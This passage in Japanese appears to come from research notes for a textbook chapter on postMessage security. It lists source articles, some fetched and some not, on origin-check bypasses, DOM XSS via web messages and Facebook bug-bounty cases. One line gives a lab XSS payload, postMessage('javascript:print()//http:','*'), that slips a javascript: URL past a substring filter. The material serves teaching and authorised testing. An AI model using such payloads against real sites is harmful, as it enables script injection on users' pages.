  - 読みどころ: (1) `getEventListeners(window)` 実行結果と DevTools「Elements → Event Listeners」の**スクリーンショット2枚**（本ノートではテキスト取得のみで画像は未収録）。(2) 各節末尾の相互リンク（Prototype Pollution / XSS ページ）。(3) 更新があった場合の追記。

### ❌ なお回収できていない一次資料（読者自身で開くこと）

- **jlajara「DOM XSS via postMessage 2」**（**未回収**） — https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html
  - 自動取得できない理由: `jlajara.gitlab.io`（GitLab Pages）が egress 403 policy denial。GitHub 側にソースミラー無し（`jlajara/jlajara.gitlab.io` 等 404 を確認）。WebSearch 予算枯渇（200/200）で二次情報も取得不可。
  - 読者が読むべきポイント（何を学ぶために読むか）: (1) **origin 検証の甘い実装 5 パターン**（`indexOf`／`search`／`match`／`startsWith` の誤用、URL 部分一致）を、実在サイトを模した具体コードで見るため。(2) postMessage 受信データが `location`/`innerHTML`/`eval` などのシンクへ届く**段階的な DOM XSS PoC 構築**の手順を追うため（本ノート §3 の抽象説明を手を動かす形で補完）。(3) iframe / `window.open` を使った**ペイロード配送のタイミング制御**の実例を得るため。(4) 前編（Part 1: `Dom_XSS_PostMessage.html`、2020/07/09）と対で読むと、基礎→応用の流れが掴めるため。
  - 代替手段: 著者 Jorge Lajara（X: @Jorge_Lajara）の同名シリーズ Part 1 も同一ブログにあり内容が連続する。HackTricks 本文 §3.2〜§3.3 が同記事の origin バイパス分類を要約済み（本ノートに逐語収録済み）なので、まず本ノートを読めば骨子は把握できる。

- **ysamm.com（Meta/Facebook 系 writeup 4本）**（**未回収**） — [4] leaking-fbevents-ato、[6] capig-xss、[7] self-xss-facebook-payments、[8] math-random-facebook-sdk
  - 自動取得できない理由: `ysamm.com` が egress 403 policy denial。個人ブログで GitHub 等にミラー無し。
  - 補足（重要）: **4 記事の技術的中核は HackTricks 本文が要約＋コード付きで転載しており、本ノート §3.11（CAPIG origin→script-src pivot）・§3.12（Self XSS Facebook Payments の trusted-origin allowlist 破り）・§3.13（Math.random GUID 予測）・§3.4/§3.11（fbevents OAuth code exfil）に逐語収録済み**。よって手法自体は本ノートで学べる。
  - 読者が原典を読むべきポイント: (1) 各バグの**実際の報奨金・タイムライン・Meta 側の修正**など、HackTricks が省いた文脈を知るため。(2) `FACEBOOK_IWL_BOOTSTRAP`／`AHP_IWL_CONFIG_STORAGE_KEY` など**実物のメッセージ種別・localStorage キー・エンドポイントパス**の完全形を確認するため。(3) `window.name` を opener 再利用で自己 opener 化する**WebView 固有トリック**の詳細手順を得るため。(4) Z3 solver へ食わせる乱数の**間引き（skip）の実装**を追うため。
  - 代替手段: 著者 Youssef Sammouda（ysamm）は Meta bug bounty 常連。同種の解説は本ノート §3.11〜§3.13 と、下記 v8-randomness-predictor（R4、回収済み）で補える。

- **PortSwigger Web Security Academy Lab（DOM XSS using web messages and a JavaScript URL）**（**未回収**） — https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url
  - 自動取得できない理由: `portswigger.net` が egress 403 policy denial。
  - 読者が読むべきポイント: (1) **`javascript:print()//http:`** による substring scheme バイパス（本ノート §3.3）を**実ラボで手を動かして再現**し、`indexOf('http:')` フィルタを通す感覚を掴むため。(2) 同シリーズの他ラボ（"Web message"→`eval`、"Web message"→`document.write` など）で**シンク別の分岐**を体系的に学ぶため。(3) 公式解法（exploit server から iframe で `postMessage('javascript:print()//http:','*')` を送る）を確認するため。
  - 代替手段: 本ノート §3.3 にラボと同一の PoC（`onload="this.contentWindow.postMessage('javascript:print()//http:','*')"`）を逐語収録済み。ラボ環境が無くてもロジックは追える。

### ✅ 補完で full 回収済み（本ノート「## 補完で回収した一次資料」R1〜R4 に逐語収録）

- **MDN `Window.postMessage()`** → R1 に逐語収録（`raw.githubusercontent.com/mdn/content` から回収）。本体で追加確認する価値: `Event.isTrusted`（別ページ [10]）、Same-origin policy の cross-origin script API access（`window.frames`/`location` 読み書き可否）は別 URL。
- **OWASP HTML5 Security Cheat Sheet - Web Messaging** → R2 に逐語収録（`raw.githubusercontent.com/OWASP/CheatSheetSeries` から回収）。
- **terjanq soXSS writeup（same-origin-xss）** → R3 に narrative 収録（`raw.githubusercontent.com/terjanq/same-origin-xss` から回収）。本体 gist で追加確認する価値: obligatory-calc calc.html gist、Winning RCs with Iframes、Postviewer v5²（Google CTF 2025）の各 gist はタイミング詳細を含む（子ページ B/C に要点は収録済み）。
- **ツール（Posta / postMessage-tracker / eventlistener-xss-recon / v8-randomness-predictor）** → R4 に README 収録。実際のインストール・使用は各リポジトリで。

---

## 教科書執筆時の注意（メタ）

- 本ページは「クライアントサイド脆弱性ハンティング」教科書の **ch07（postMessage）** の中核。送信側（`targetOrigin='*'`）と受信側（origin 検証不備）の 2 軸で章立てすると整理しやすい。
- コード PoC はすべて逐語で保存済み。教科書転記時は環境依存の URL（`so-xss.terjanq.me`、`obligatory-calc.ctf.sekai.team`、`127.0.0.1:21501` 等）が CTF/デモ由来である旨を注記すること。
- 攻撃記述はすべて防御・診断（許可された検証・バグバウンティ前提）の文脈で書く。各手法には対応する対策を併記済み（表参照）。
